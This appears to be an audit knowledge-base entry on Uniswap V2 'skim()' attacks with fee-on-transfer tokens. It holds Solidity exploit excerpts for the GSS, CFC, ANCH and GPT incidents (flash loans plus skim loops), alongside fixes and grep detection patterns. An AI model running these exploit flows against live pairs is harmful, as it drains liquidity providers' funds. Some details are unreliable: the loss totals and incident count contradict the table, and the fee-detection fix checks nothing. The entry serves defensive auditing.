---
protocol: generic
chain: bsc
category: skim_balance
vulnerability_type: pair_skim_exploitation

# Pattern Identity (Required)
root_cause_family: stale_accounting
pattern_key: pair_skim_exploitation | uniswap_v2_pair | economic_exploit | fund_loss

# Interaction Scope
interaction_scope: single_contract

attack_type: economic_exploit
affected_component: uniswap_v2_pair

primitives:
  - skim_function
  - reserve_tracking
  - balance_discrepancy
  - fee_on_transfer
  - sync_function
  - pair_manipulation
  - deflationary_token
  - reflection_token

severity: medium
impact: fund_loss
exploitability: 0.65
financial_impact: medium

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "skim"
  - "swap"
  - "sync"
  - "pair.sync"
  - "skim(pair"
  - "createPair"
  - "testExploit"
  - "address(pair"
  - "innerCallback"
  - "skim(attacker"
  - "DPPFlashLoanCall"
  - "skim(address(pair"
  - "addLiquidityWithFeeToken"
path_keys:
  - "anch_token"
  - "cfc_token"
  - "gpt_token"
  - "gss_token"

tags:
  - skim
  - uniswap_v2
  - pair_manipulation
  - reserve_sync
  - fee_on_transfer
  - deflationary_token
  - balance_inflation
  - flash_loan
  - real_exploit
  - defi
  - DeFiHackLabs

source: DeFiHackLabs
total_exploits_analyzed: 4
total_losses: "$41K+"
---

## Skim Token Balance Attack Patterns


## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [ANCH-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-08/ANCH_exp.sol` |
| [CFC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/CFC_exp.sol` |
| [GPT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-05/GPT_exp.sol` |
| [GSS-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-08/GSS_exp.sol` |
| [HACKDAO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-05/HackDao_exp.sol` |

---

### Overview

Skim balance attacks exploit the `skim()` function in Uniswap V2-style AMMs. The `skim()` function sends excess tokens (the difference between actual token balance and recorded reserves) to a specified address. When combined with deflationary or fee-on-transfer tokens, attackers create compounding reserve discrepancies through repeated `skim → pair` loops, then extract the accumulated surplus.


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `stale_accounting` |
| Pattern Key | `pair_skim_exploitation | uniswap_v2_pair | economic_exploit | fund_loss` |
| Severity | MEDIUM |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | bsc |


### Vulnerability Description

#### Root Cause

The root causes fall into two distinct patterns:

1. **Fee-on-Transfer Reserve Divergence**: When a fee-on-transfer token is sent to a pair, the pair receives less than the sent amount due to the transfer fee. However, `skim()` calculates excess based on the actual balance vs stored reserves. By looping `skim(address(pair))`, each iteration compounds the discrepancy because the fee mechanism burns tokens during each internal transfer, causing reserves and balances to progressively diverge.

2. **Broken Fee Mechanism Amplification**: Some tokens have buggy fee mechanisms that cause the pair to receive MORE tokens than expected during transfers. Each `transfer → skim` cycle exploits this accounting error to accumulate excess tokens. The `sync()` call at the start ensures reserves match balances before the manipulation begins.

#### Attack Scenario

**Skim Loop with Deflationary Token (GSS/ANCH pattern)**:
1. Flash loan stablecoin (USDT/BUSD) from DODO
2. Buy the deflationary token on DEX
3. Transfer tokens to the pair contract
4. Loop `skim(address(pair))` 30-60 times — each iteration sends excess back to pair, but transfer fee creates growing discrepancy
5. Final `skim(attacker)` extracts all accumulated surplus
6. Sell tokens, repay flash loan, profit

**Broken Fee + Skim (GPT pattern)**:
1. Chain multiple flash loans for maximum capital
2. Call `pair.sync()` to align reserves
3. Buy the broken-fee token
4. Loop: transfer tiny amount to pair → `skim()` extracts fee-inflated excess
5. Sell all accumulated tokens, repay flash loans

---

### Vulnerable Pattern Examples

#### Category 1: Fee-on-Transfer Token — skim(pair) Loop [MEDIUM]

> **pathShape**: `callback-reentrant`

**Example 1: GSS Token — Flash Loan + Skim Loop (2023-08, ~$24.8K)** [MEDIUM]
```solidity
// ❌ VULNERABLE: Pair.skim() with fee-on-transfer token creates exploitable reserve gap
// GSS has a transfer fee that burns tokens on each transfer

// Key interfaces:
interface IUniswapV2Pair {
    function skim(address to) external;     // @audit Sends (balance - reserve) to `to`
    function sync() external;               // @audit Updates reserves to match balance
    function swap(uint, uint, address, bytes calldata) external;
}

// Attack flow from DeFiHackLabs PoC:
function testExploit() public {
    // Step 1: Flash loan 10K USDT from DODO
    DVM(dodo).flashLoan(0, 10_000 * 1e18, address(this), new bytes(1));
}

function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Step 2: Buy GSS (fee-on-transfer token)
    swapUSDTforGSS();

    // Step 3: Transfer all GSS to the pair
    GSS.transfer(address(Pair), GSS.balanceOf(address(this)));

    // Step 4: skim loop — compound the fee discrepancy
    // @audit Each skim(pair) sends excess tokens BACK to pair via transfer
    // @audit The transfer fee burns tokens, creating new excess for next skim
    for (uint256 i = 0; i < 30; i++) {
        Pair.skim(address(Pair));  // excess → pair (with fee burn on transfer)
    }
    // Step 5: Final skim to attacker — extract accumulated surplus
    Pair.skim(address(this));  // @audit Collects all compounded excess

    // Step 6: Sell GSS back to USDT
    swapGSSforUSDT();

    // Step 7: Repay flash loan
    USDT.transfer(dodo, 10_000 * 1e18);
    // Profit: ~$24.8K
}
```
- **PoC**: `DeFiHackLabs/src/test/2023-08/GSS_exp.sol`
- **Attack TX**: https://bscscan.com/tx/0x4f8cb9efb3cc9930bd38af5f5d34d15ce683111599a80df7ae50b003e746e336
- **Root Cause**: GSS token has a transfer fee. When `skim()` sends excess to `address(pair)`, the fee mechanism burns tokens during transit, so the pair's balance drops below what was sent. This creates a NEW excess for the next `skim()` call — 30 iterations compound the extraction.

**Example 2: CFC Token — Chained DODO Flash Loans + 18-Iteration Skim (2023-06, ~$16K)** [MEDIUM]
```solidity
// ❌ VULNERABLE: Multiple flash loans amplify skim loop capital
// CFC is another fee-on-transfer token on BSC

function testExploit() public {
    // Chain 5 DODO flash loans for maximum capital
    DVM(dodo1).flashLoan(0, 50_000 * 1e18, address(this), new bytes(1));
    // → callback chains: dodo1 → dodo2 → dodo3 → dodo4 → dodo5
}

function innerCallback() internal {
    // Buy CFC with accumulated USDT
    swapUSDTforCFC();

    // Transfer CFC to pair
    CFC.transfer(address(Pair), CFC.balanceOf(address(this)));

    // @audit 18-iteration skim loop — each iteration amplifies the fee gap
    for (uint256 i = 0; i < 18; i++) {
        Pair.skim(address(Pair));
        // After each skim: pair receives tokens MINUS fee
        // Reserve stays the same, balance keeps diverging
    }
    Pair.skim(address(this));  // @audit Extract all accumulated excess

    // Sell all CFC for USDT
    swapCFCforUSDT();

    // Repay all 5 flash loans in reverse order
    USDT.transfer(dodo5, repayAmount5);
    // ... chain back to dodo1
}
```
- **PoC**: `DeFiHackLabs/src/test/2023-06/CFC_exp.sol`
- **Root Cause**: 5 cascading DODO flash loans provide maximum capital. CFC's fee-on-transfer mechanism creates a compounding gap during 18 `skim(pair)` iterations.

**Example 3: ANCH Token — 60-Iteration Skim with DODO Flash Loan (2022-08)** [MEDIUM]
```solidity
// ❌ VULNERABLE: High-iteration skim loop with deflationary token

function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    // Flash loan 50K USDT from DODO
    // Buy ANCH (deflationary token)
    buyANCH();

    // Transfer ANCH to pair
    ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));

    // @audit 60 iterations — maximizes fee-gap compounding
    for (uint256 index = 0; index < 60; index++) {
        Pair.skim(address(Pair));  // @audit Excess → pair (with fee burn)
    }
    Pair.skim(address(this));      // @audit Collect all accumulated surplus

    // Sell inflated ANCH back for USDT profit
    sellANCH();
    USDT.transfer(dodo, 50_000 * 1e18);  // repay flash loan
}
```
- **PoC**: `DeFiHackLabs/src/test/2022-08/ANCH_exp.sol`
- **Root Cause**: ANCH's transfer fee mechanism compounds across 60 `skim(pair)` iterations. Each skim triggers a transfer with fee deduction, creating new excess for the next iteration.

---

#### Category 2: Broken Fee Mechanism + Skim Extraction [HIGH]

> **pathShape**: `callback-reentrant`

**Example 4: GPT Token — Broken Fee + transfer→skim Loop (2023-05, ~$42K)** [HIGH]
```solidity
// ❌ VULNERABLE: GPT token has a broken fee mechanism that creates phantom tokens
// Key pattern: transfer tiny amount → skim extracts inflated excess

function testExploit() public {
    // Chain 5 DODO flash loans for maximum BUSD
    doFlashLoan(oracle1);  // → oracle2 → oracle3 → oracle4 → oracle5
}

function innerCallback() internal {
    // @audit Sync first — align reserves with actual balances
    pair.sync();

    // Buy GPT with 100K BUSD
    router.swapExactTokensForTokens(100_000 ether, 0, path, address(this), deadline);

    // @audit Exploit the broken fee mechanism:
    // Transfer tiny amounts to pair, skim extracts more than was sent
    GPT.approve(address(this), type(uint256).max);
    for (uint256 i = 0; i < 50; ++i) {
        GPT.transferFrom(
            address(this),
            address(pair),
            0.5 ether         // @audit Send 0.5 GPT to pair
        );
        pair.skim(address(this));  // @audit Extracts MORE than 0.5 GPT due to broken fee
    }

    // Sell all accumulated GPT directly through pair
    uint256 outAmount = router.getAmountsOut(GPT.balanceOf(address(this)), path)[1];
    GPT.transfer(address(pair), GPT.balanceOf(address(this)));
    pair.swap(outAmount, 0, address(this), bytes(""));

    // Repay all flash loans
    BUSD.transfer(msg.sender, quoteAmount);
}
```
- **PoC**: `DeFiHackLabs/src/test/2023-05/GPT_exp.sol`
- **Root Cause**: GPT token has a broken fee mechanism. When tokens are transferred to the pair, the fee logic causes the pair to receive more tokens than the nominal transfer amount (or the internal accounting becomes inconsistent). Each `transferFrom → skim` cycle extracts the fee-inflated excess.

---

### Impact Analysis

#### Technical Impact
- **Reserve Manipulation**: Pair reserves diverge from actual token balances
- **Compounding Extraction**: Each skim iteration amplifies the extraction amount
- **Flash Loan Amplification**: Attack capital is borrowed, making it risk-free for the attacker
- **Fee-on-Transfer Incompatibility**: AMM pairs are fundamentally incompatible with deflationary tokens

#### Business Impact
- **Scale**: $41K+ total losses across 4 documented exploits
- **Recurring Pattern**: Same attack vector repeated across GSS, CFC, ANCH, HackDao, GPT
- **DEX Risk**: Any Uniswap V2 fork paired with a fee-on-transfer token is potentially vulnerable
- **Token Design**: Fee-on-transfer tokens create systemic risk for AMM liquidity providers

---

### Secure Implementation

**Fix 1: Use Actual Balance Difference Instead of skim()**
```solidity
// ✅ SECURE: Track actual received amounts, don't rely on skim()
function addLiquidityWithFeeToken(address token, uint256 amount) external {
    uint256 balanceBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).transferFrom(msg.sender, address(this), amount);
    uint256 actualReceived = IERC20(token).balanceOf(address(this)) - balanceBefore;
    // @audit Use actualReceived, not amount, for reserve tracking
    _updateReserves(token, actualReceived);
}
```

**Fix 2: Add Access Control to skim()**
```solidity
// ✅ SECURE: Restrict skim() to prevent loop exploitation
function skim(address to) external nonReentrant {
    // @audit Rate-limit skim calls or restrict to governance
    require(block.number > lastSkimBlock + SKIM_COOLDOWN, "skim cooldown");
    lastSkimBlock = block.number;

    address _token0 = token0;
    address _token1 = token1;
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
}
```

**Fix 3: Reject Fee-on-Transfer Tokens**
```solidity
// ✅ SECURE: Detect fee-on-transfer tokens during pair creation
function createPair(address tokenA, address tokenB) external returns (address pair) {
    // @audit Test if tokens have transfer fees
    uint256 testAmount = 1000;
    uint256 balBefore = IERC20(tokenA).balanceOf(address(this));
    IERC20(tokenA).transfer(address(this), testAmount);
    uint256 balAfter = IERC20(tokenA).balanceOf(address(this));
    require(balAfter - balBefore == testAmount, "fee-on-transfer tokens not supported");
    // ... create pair
}
```

---

### Detection Patterns

```bash
# Direct skim() callsgrep -rn "\.skim(" --include="*.sol"

# skim() inside loops
grep -B5 "\.skim(" --include="*.sol" | grep "for\s*("

# Pair.sync() followed by manipulation
grep -A10 "\.sync()" --include="*.sol" | grep "\.skim\|\.transfer"

# Fee-on-transfer token interactions with pairs
grep -rn "SupportingFeeOnTransfer\|deflationary\|reflection" --include="*.sol"

# Flash loan + skim pattern
grep -rn "flashLoan\|DPPFlashLoanCall" --include="*.sol" | head -20
```

---

### Audit Checklist

1. **Does the pair interact with fee-on-transfer/deflationary tokens?** — If yes, verify skim() cannot be looped to compound extraction
2. **Is skim() callable by anyone?** — Consider adding rate limiting, cooldown, or access control
3. **Does skim() allow `to == address(pair)`?** — This enables the compounding loop; consider blocking self-skim
4. **Are reserves updated atomically with balance changes?** — Verify sync() and _update() handle fee-on-transfer amounts correctly
5. **Can flash loans provide the initial capital?** — The attack is risk-free when combined with flash loans
6. **How many iterations amplify the gap to profitability?** — Test with 30, 50, 100 iterations for each paired token

---

### Real-World Examples

| Protocol | Date | Loss | Attack Vector | Chain |
|----------|------|------|---------------|-------|
| GSS | 2023-08 | $24.8K | Flash loan + 30x skim(pair) loop with fee-on-transfer | BSC |
| CFC | 2023-06 | $16K | 5 chained DODO flash loans + 18x skim loop | BSC |
| GPT Token | 2023-05 | $42K | Broken fee + 50x transfer→skim loop | BSC |
| ANCH | 2022-08 | N/A | 60x skim(pair) loop with deflationary token | BSC |
| HackDao | 2022-05 | N/A | Skim balance manipulation | BSC |

---

### DeFiHackLabs PoC References

- **GSS** (2023-08, $24.8K): `DeFiHackLabs/src/test/2023-08/GSS_exp.sol`
- **CFC** (2023-06, $16K): `DeFiHackLabs/src/test/2023-06/CFC_exp.sol`
- **GPT Token** (2023-05, $42K): `DeFiHackLabs/src/test/2023-05/GPT_exp.sol`
- **ANCH** (2022-08): `DeFiHackLabs/src/test/2022-08/ANCH_exp.sol`
- **HackDao** (2022-05): `DeFiHackLabs/src/test/2022-05/HackDao_exp.sol`

---

### Keywords

- skim
- skim_loop
- skim_balance
- pair_skim
- uniswap_v2
- fee_on_transfer
- deflationary_token
- reserve_discrepancy
- balance_manipulation
- sync
- flash_loan
- DODO
- pair_manipulation
- broken_fee
- reflection_token
- DeFiHackLabs

---

### Related Vulnerabilities

- [Fee-on-Transfer Token Issues](../../general/fee-on-transfer-tokens/) — Token compatibility patterns
- [Flash Loan Attack Patterns](../../general/flash-loan-attacks/) — Flash loan enabled attacks
- [AMM Vulnerabilities](../../amm/) — General AMM security patterns
